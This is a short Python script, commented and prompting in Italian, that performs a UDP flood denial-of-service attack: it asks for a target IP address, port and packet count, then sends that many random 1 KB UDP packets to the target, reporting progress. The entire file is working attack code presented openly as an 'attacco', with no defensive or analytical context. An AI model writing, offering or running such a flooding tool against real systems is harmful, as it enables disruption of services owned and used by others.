import socket
import random
import time

# Funzione per generare pacchetti di 1 KB
def generate_packet():
    return random._urandom(1024)  # 1024 byte (1 KB)

# Funzione per lanciare l'attacco UDP Flood
def udp_flood(target_ip, target_port, num_packets):
    try:
        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Contatore pacchetti inviati
        sent_packets = 0
        
        print(f"Inizio attacco UDP flood su {target_ip}:{target_port}")
        
        # Ciclo per inviare i pacchetti
        for _ in range(num_packets):
            packet = generate_packet()
            sock.sendto(packet, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 100 == 0:
                print(f"{sent_packets} pacchetti inviati.")
            
            # Aggiungi un piccolo ritardo (opzionale per non sovraccaricare troppo velocemente)
            time.sleep(0.01)
        
        print(f"\nAttacco completato. {sent_packets} pacchetti inviati al target.")
    
    except Exception as e:
        print(f"Errore: {e}")
    finally:
        sock.close()

# Funzione principale
def main():
    # Input dell'utente per l'IP e la porta del target
    target_ip = input("Inserisci l'IP della macchina target: ")
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
    
    # Lancia l'attacco
    udp_flood(target_ip, target_port, num_packets)

if __name__ == "__main__":
    main()
